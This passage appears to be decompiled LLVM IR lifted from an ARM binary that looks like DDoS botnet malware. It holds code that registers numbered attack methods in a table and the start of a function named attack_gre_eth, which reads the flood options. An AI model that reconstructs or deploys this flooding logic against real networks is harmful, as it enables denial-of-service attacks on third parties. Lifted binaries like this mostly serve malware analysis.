  %v2_86ac = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_21c10.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_21c10.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_21c10.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_21c10.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_21c10.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_21c10.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_21c10.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_21c10.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_21c10.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.56 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21c0c.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_21c0d.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_21c0c.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21c0c.29 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 65535, i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
